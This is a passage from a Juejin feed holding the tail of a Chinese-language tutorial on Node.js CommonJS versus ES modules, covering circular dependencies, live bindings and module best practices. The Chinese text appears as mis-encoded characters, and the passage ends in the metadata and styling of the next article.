<li><strong>ä¾èµ–æ³¨å…¥</strong>ï¼šé€šè¿‡å‚æ•°ä¼ é€’ä¾èµ–</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå»¶è¿Ÿå¼•ç”¨</span>
<span class="hljs-comment">// a.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">getB</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b'</span>);  <span class="hljs-comment">// å»¶è¿ŸåŠ è½½</span>
    <span class="hljs-keyword">return</span> b;
  }
};

<span class="hljs-comment">// æ›´å¥½çš„åšæ³•ï¼šé‡æ„</span>
<span class="hljs-comment">// common.jsï¼ˆæå–å…¬å…±åŠŸèƒ½ï¼‰</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">sharedFunction</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å…±äº«é€»è¾‘</span>
  }
};

<span class="hljs-comment">// a.js</span>
<span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./common'</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-comment">// ä½¿ç”¨ common</span>
};

<span class="hljs-comment">// b.js</span>
<span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./common'</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-comment">// ä½¿ç”¨ common</span>
};
</code></pre>
<h3 data-id="heading-38">ESM ä¸­çš„å¾ªç¯ä¾èµ–</h3>
<p>ESM å¯¹å¾ªç¯ä¾èµ–çš„å¤„ç†æ›´åŠ ä¸¥æ ¼å’Œå¯é¢„æµ‹ã€‚</p>
<h4 data-id="heading-39">ESM å¾ªç¯ä¾èµ–ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.mjs</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.mjs å¼€å§‹æ‰§è¡Œ'</span>);
<span class="hljs-keyword">import</span> { bDone } <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.mjs ä¸­ï¼ŒbDone ='</span>, bDone);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> aDone = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.mjs æ‰§è¡Œå®Œæ¯•'</span>);

<span class="hljs-comment">// b.mjs</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.mjs å¼€å§‹æ‰§è¡Œ'</span>);
<span class="hljs-keyword">import</span> { aDone } <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.mjs ä¸­ï¼ŒaDone ='</span>, aDone);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> bDone = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.mjs æ‰§è¡Œå®Œæ¯•'</span>);

<span class="hljs-comment">// main.mjs</span>
<span class="hljs-keyword">import</span> { aDone } <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.mjs'</span>;
<span class="hljs-keyword">import</span> { bDone } <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'main.mjs ä¸­ï¼ŒaDone ='</span>, aDone, <span class="hljs-string">'bDone ='</span>, bDone);
</code></pre>
<p><strong>æ‰§è¡Œç»“æœ</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">a.mjs å¼€å§‹æ‰§è¡Œ
b.mjs å¼€å§‹æ‰§è¡Œ
b.mjs ä¸­ï¼Œ<span class="hljs-attr">aDone</span> = undefinedï¼ˆç»‘å®šå­˜åœ¨ä½†å€¼æœªåˆå§‹åŒ–ï¼‰
b.mjs æ‰§è¡Œå®Œæ¯•
a.mjs ä¸­ï¼Œ<span class="hljs-attr">bDone</span> = <span class="hljs-literal">true</span>
a.mjs æ‰§è¡Œå®Œæ¯•
main.mjs ä¸­ï¼Œ<span class="hljs-attr">aDone</span> = <span class="hljs-literal">true</span> bDone = <span class="hljs-literal">true</span>
</code></pre>
<p><strong>ESM çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>ç»‘å®šï¼ˆBindingï¼‰</strong>ï¼šESM å¯¼å‡ºçš„æ˜¯å€¼çš„ç»‘å®šï¼Œä¸æ˜¯å€¼çš„å‰¯æœ¬</li>
<li><strong>æå‡ï¼ˆHoistingï¼‰</strong>ï¼šå¯¼å…¥çš„ç»‘å®šåœ¨æ¨¡å—æ‰§è¡Œå‰å°±å­˜åœ¨</li>
<li><strong>å®æ—¶ç»‘å®šï¼ˆLive Bindingï¼‰</strong>ï¼šå¯¼å…¥çš„å€¼ä¼šéšç€å¯¼å‡ºæ¨¡å—çš„å˜åŒ–è€Œå˜åŒ–</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.mjs</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
  count++;
}

<span class="hljs-comment">// app.mjs</span>
<span class="hljs-keyword">import</span> { count, increment } <span class="hljs-keyword">from</span> <span class="hljs-string">'./counter.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);  <span class="hljs-comment">// 0</span>
<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);  <span class="hljs-comment">// 1ï¼ˆå®æ—¶ç»‘å®šï¼‰</span>
</code></pre>
<h4 data-id="heading-40">ESM å¾ªç¯ä¾èµ–çš„ä¼˜åŠ¿</h4>
<ol>
<li><strong>å¯é¢„æµ‹æ€§</strong>ï¼šè¡Œä¸ºæ›´åŠ å¯é¢„æµ‹</li>
<li><strong>é™æ€åˆ†æ</strong>ï¼šå¯ä»¥åœ¨ç¼–è¯‘æ—¶æ£€æµ‹å¾ªç¯ä¾èµ–</li>
<li><strong>æ›´å¥½çš„å·¥å…·æ”¯æŒ</strong>ï¼šIDE å’Œå·¥å…·å¯ä»¥æ›´å¥½åœ°åˆ†æä¾èµ–å…³ç³»</li>
</ol>
<hr/>
<h2 data-id="heading-41">æ¨¡å—æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-42">1. é€‰æ‹©åˆé€‚çš„æ¨¡å—ç³»ç»Ÿ</h3>
<h4 data-id="heading-43">ä½¿ç”¨ CommonJS çš„åœºæ™¯</h4>
<ul>
<li>éœ€è¦ä¸å¤§é‡ç°æœ‰ CommonJS ä»£ç å…¼å®¹</li>
<li>éœ€è¦åŠ¨æ€å¯¼å…¥ï¼ˆæ¡ä»¶å¯¼å…¥ï¼‰</li>
<li>é¡¹ç›®ä¸»è¦è¿è¡Œåœ¨ Node.js ç¯å¢ƒ</li>
</ul>
<h4 data-id="heading-44">ä½¿ç”¨ ESM çš„åœºæ™¯</h4>
<ul>
<li>æ–°é¡¹ç›®ï¼ˆæ¨èï¼‰</li>
<li>éœ€è¦åœ¨æµè§ˆå™¨å’Œ Node.js ä¸­è¿è¡Œ</li>
<li>éœ€è¦åˆ©ç”¨é™æ€åˆ†æå’Œ Tree Shaking</li>
<li>éœ€è¦é¡¶å±‚ <code>await</code></li>
</ul>
<h3 data-id="heading-45">2. é¿å…å¾ªç¯ä¾èµ–</h3>
<p><strong>è®¾è®¡åŸåˆ™</strong>ï¼š</p>
<ul>
<li>ä¿æŒæ¨¡å—çš„å•ä¸€èŒè´£</li>
<li>æå–å…¬å…±åŠŸèƒ½åˆ°ç‹¬ç«‹æ¨¡å—</li>
<li>ä½¿ç”¨ä¾èµ–æ³¨å…¥</li>
</ul>
<p><strong>æ£€æµ‹å·¥å…·</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ madge æ£€æµ‹å¾ªç¯ä¾èµ–</span>
npm install -g madge
madge --circular --extensions js ./src
</code></pre>
<h3 data-id="heading-46">3. æ¨¡å—ç»„ç»‡æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-47">ç›®å½•ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash">project/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ modules/          <span class="hljs-comment"># åŠŸèƒ½æ¨¡å—</span>
â”‚   â”‚   â”œâ”€â”€ user/
â”‚   â”‚   â”‚   â”œâ”€â”€ index.js
â”‚   â”‚   â”‚   â”œâ”€â”€ model.js
â”‚   â”‚   â”‚   â””â”€â”€ service.js
â”‚   â”‚   â””â”€â”€ product/
â”‚   â”œâ”€â”€ utils/            <span class="hljs-comment"># å·¥å…·å‡½æ•°</span>
â”‚   â”‚   â”œâ”€â”€ index.js
â”‚   â”‚   â””â”€â”€ helpers.js
â”‚   â”œâ”€â”€ config/           <span class="hljs-comment"># é…ç½®æ–‡ä»¶</span>
â”‚   â”‚   â””â”€â”€ index.js
â”‚   â””â”€â”€ index.js          <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
â”œâ”€â”€ node_modules/
â”œâ”€â”€ package.json
â””â”€â”€ README.md
</code></pre>
<h4 data-id="heading-48">å¯¼å‡ºæ¨¡å¼</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¥½çš„åšæ³•ï¼šæ¸…æ™°çš„å¯¼å‡º</span>
<span class="hljs-comment">// utils/index.js</span>
<span class="hljs-keyword">export</span> { formatDate } <span class="hljs-keyword">from</span> <span class="hljs-string">'./date'</span>;
<span class="hljs-keyword">export</span> { validateEmail } <span class="hljs-keyword">from</span> <span class="hljs-string">'./validation'</span>;
<span class="hljs-keyword">export</span> { debounce } <span class="hljs-keyword">from</span> <span class="hljs-string">'./performance'</span>;

<span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯¼å‡ºè¿‡å¤š</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./date'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./validation'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./performance'</span>;
</code></pre>
<h3 data-id="heading-49">4. æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-50">åˆ©ç”¨æ¨¡å—ç¼“å­˜</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… å¥½çš„åšæ³•ï¼šåˆ©ç”¨ç¼“å­˜</span>
<span class="hljs-keyword">const</span> heavyModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./heavy-module'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> heavyModule.<span class="hljs-title function_">process</span>();  <span class="hljs-comment">// ä½¿ç”¨ç¼“å­˜çš„æ¨¡å—</span>
}

<span class="hljs-comment">// âŒ ä¸å¥½çš„åšæ³•ï¼šé‡å¤åŠ è½½</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> heavyModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./heavy-module'</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½åŠ è½½</span>
  <span class="hljs-keyword">return</span> heavyModule.<span class="hljs-title function_">process</span>();
}
</code></pre>
<h4 data-id="heading-51">å»¶è¿ŸåŠ è½½ï¼ˆLazy Loadingï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// CommonJSï¼šå»¶è¿ŸåŠ è½½</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getHeavyModule</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!heavyModule) {
    heavyModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./heavy-module'</span>);
  }
  <span class="hljs-keyword">return</span> heavyModule;
}

<span class="hljs-comment">// ESMï¼šåŠ¨æ€å¯¼å…¥</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { process } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./heavy-module.mjs'</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">process</span>();
}
</code></pre>
<h3 data-id="heading-52">5. é”™è¯¯å¤„ç†</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// CommonJSï¼šé”™è¯¯å¤„ç†</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./module'</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-keyword">if</span> (error.<span class="hljs-property">code</span> === <span class="hljs-string">'MODULE_NOT_FOUND'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ¨¡å—æœªæ‰¾åˆ°'</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½æ¨¡å—æ—¶å‡ºé”™:'</span>, error);
  }
}

<span class="hljs-comment">// ESMï¼šé”™è¯¯å¤„ç†</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./module.mjs'</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-keyword">if</span> (error.<span class="hljs-property">code</span> === <span class="hljs-string">'ERR_MODULE_NOT_FOUND'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ¨¡å—æœªæ‰¾åˆ°'</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½æ¨¡å—æ—¶å‡ºé”™:'</span>, error);
  }
}
</code></pre>
<h3 data-id="heading-53">6. æ¨¡å—æµ‹è¯•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµ‹è¯•æ¨¡å—å¯¼å‡º</span>
<span class="hljs-comment">// math.test.js</span>
<span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);

<span class="hljs-title function_">test</span>(<span class="hljs-string">'add function'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">expect</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)).<span class="hljs-title function_">toBe</span>(<span class="hljs-number">5</span>);
});

<span class="hljs-comment">// æ¨¡æ‹Ÿæ¨¡å—ä¾èµ–</span>
jest.<span class="hljs-title function_">mock</span>(<span class="hljs-string">'./dependency'</span>, <span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-attr">someFunction</span>: jest.<span class="hljs-title function_">fn</span>()
}));
</code></pre>
<h3 data-id="heading-54">7. æ–‡æ¡£å’Œæ³¨é‡Š</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * æ•°å­¦å·¥å…·æ¨¡å—
 * <span class="hljs-doctag">@module</span> <span class="hljs-variable">math</span>
 */</span>

<span class="hljs-comment">/**
 * ä¸¤æ•°ç›¸åŠ 
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">a</span> - ç¬¬ä¸€ä¸ªæ•°
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">b</span> - ç¬¬äºŒä¸ªæ•°
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} ä¸¤æ•°ä¹‹å’Œ
 */</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
};
</code></pre>
<h3 data-id="heading-55">8. ç‰ˆæœ¬ç®¡ç†</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-package"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"index.js"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./index.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"./utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./utils/index.js"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=14.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-56">9. æ··åˆä½¿ç”¨ CommonJS å’Œ ESM</h3>
<h4 data-id="heading-57">åœ¨ CommonJS ä¸­ä½¿ç”¨ ESM</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app.js (CommonJS)</span>
(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">default</span>: esmModule } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./esm-module.mjs'</span>);
  <span class="hljs-comment">// ä½¿ç”¨ ESM æ¨¡å—</span>
})();
</code></pre>
<h4 data-id="heading-58">åœ¨ ESM ä¸­ä½¿ç”¨ CommonJS</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app.mjs (ESM)</span>
<span class="hljs-keyword">import</span> { createRequire } <span class="hljs-keyword">from</span> <span class="hljs-string">'module'</span>;
<span class="hljs-keyword">const</span> <span class="hljs-built_in">require</span> = <span class="hljs-title function_">createRequire</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);

<span class="hljs-keyword">const</span> commonjsModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./commonjs-module.js'</span>);
</code></pre>
<h3 data-id="heading-59">10. å®‰å…¨æ£€æŸ¥</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ£€æŸ¥æ¨¡å—æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">moduleExists</span>(<span class="hljs-params">moduleName</span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-built_in">require</span>.<span class="hljs-title function_">resolve</span>(moduleName);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-comment">// æ¡ä»¶å¯¼å…¥</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_">moduleExists</span>(<span class="hljs-string">'optional-module'</span>)) {
  <span class="hljs-keyword">const</span> optional = <span class="hljs-built_in">require</span>(<span class="hljs-string">'optional-module'</span>);
  <span class="hljs-comment">// ä½¿ç”¨å¯é€‰æ¨¡å—</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-60">æ€»ç»“</h2>
<h3 data-id="heading-61">CommonJS vs ESM å¯¹æ¯”</h3>


















































<table><thead><tr><th>ç‰¹æ€§</th><th>CommonJS</th><th>ESM</th></tr></thead><tbody><tr><td>è¯­æ³•</td><td><code>require</code> / <code>module.exports</code></td><td><code>import</code> / <code>export</code></td></tr><tr><td>åŠ è½½æ—¶æœº</td><td>è¿è¡Œæ—¶</td><td>ç¼–è¯‘æ—¶ï¼ˆé™æ€ï¼‰</td></tr><tr><td>æ–‡ä»¶æ‰©å±•å</td><td>å¯é€‰</td><td>å¿…éœ€ï¼ˆ.mjs æˆ– .js with type: moduleï¼‰</td></tr><tr><td>åŠ¨æ€å¯¼å…¥</td><td>åŸç”Ÿæ”¯æŒ</td><td><code>import()</code> å‡½æ•°</td></tr><tr><td>é¡¶å±‚ await</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>å¾ªç¯ä¾èµ–</td><td>éƒ¨åˆ†æ”¯æŒï¼ˆå¯èƒ½æœ‰é—®é¢˜ï¼‰</td><td>æ›´å¥½çš„æ”¯æŒ</td></tr><tr><td>Tree Shaking</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>ä¸¥æ ¼æ¨¡å¼</td><td>é»˜è®¤å¦</td><td>é»˜è®¤æ˜¯</td></tr></tbody></table>
<h3 data-id="heading-62">å…³é”®è¦ç‚¹</h3>
<ol>
<li><strong>CommonJS</strong> æ˜¯ Node.js çš„é»˜è®¤æ¨¡å—ç³»ç»Ÿï¼Œé€‚åˆå¤§å¤šæ•° Node.js é¡¹ç›®</li>
<li><strong>ESM</strong> æ˜¯ JavaScript çš„æ ‡å‡†ï¼Œé€‚åˆæ–°é¡¹ç›®å’Œéœ€è¦æµè§ˆå™¨å…¼å®¹çš„é¡¹ç›®</li>
<li><strong>æ¨¡å—ç¼“å­˜</strong> æé«˜äº†æ€§èƒ½ï¼Œä½†ä¹Ÿæ„å‘³ç€æ¨¡å—çŠ¶æ€æ˜¯å…±äº«çš„</li>
<li><strong>å¾ªç¯ä¾èµ–</strong> åº”è¯¥é¿å…ï¼Œå¦‚æœæ— æ³•é¿å…ï¼Œè¦ç†è§£å…¶è¡Œä¸º</li>
<li><strong>é€‰æ‹©åˆé€‚çš„æ¨¡å—ç³»ç»Ÿ</strong> å¹¶éµå¾ªæœ€ä½³å®è·µï¼Œå¯ä»¥æé«˜ä»£ç è´¨é‡å’Œå¯ç»´æŠ¤æ€§</li>
</ol>
<h3 data-id="heading-63">æ¨èé˜…è¯»</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html" target="_blank" title="https://nodejs.org/api/modules.html" ref="nofollow noopener noreferrer">Node.js å®˜æ–¹æ–‡æ¡£ - Modules</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fesm.html" target="_blank" title="https://nodejs.org/api/esm.html" ref="nofollow noopener noreferrer">Node.js å®˜æ–¹æ–‡æ¡£ - ES Modules</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FModules" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" ref="nofollow noopener noreferrer">MDN - JavaScript Modules</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSAPIThree åŠ è½½ WMSã€WMTS å’Œé€šç”¨æ …æ ¼å›¾å­¦ä¹ ç¬”è®°ï¼šæ ‡å‡†åœ°å›¾æœåŠ¡ä¸åˆ‡å›¾è§„åˆ™]]></title>    <link>https://juejin.cn/post/7582202149909659657</link>    <guid>https://juejin.cn/post/7582202149909659657</guid>    <pubDate>2025-12-11T07:57:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582202149909659657" data-draft-id="7582231988146323507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSAPIThree åŠ è½½ WMSã€WMTS å’Œé€šç”¨æ …æ ¼å›¾å­¦ä¹ ç¬”è®°ï¼šæ ‡å‡†åœ°å›¾æœåŠ¡ä¸åˆ‡å›¾è§„åˆ™"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-11T07:57:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·296541275917"/> <meta itemprop="url" content="https://juejin.cn/user/4109293389357897"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSAPIThree åŠ è½½ WMSã€WMTS å’Œé€šç”¨æ …æ ¼å›¾å­¦ä¹ ç¬”è®°ï¼šæ ‡å‡†åœ°å›¾æœåŠ¡ä¸åˆ‡å›¾è§„åˆ™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4109293389357897/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·296541275917
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:57:10.000Z" title="Thu Dec 11 2025 07:57:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 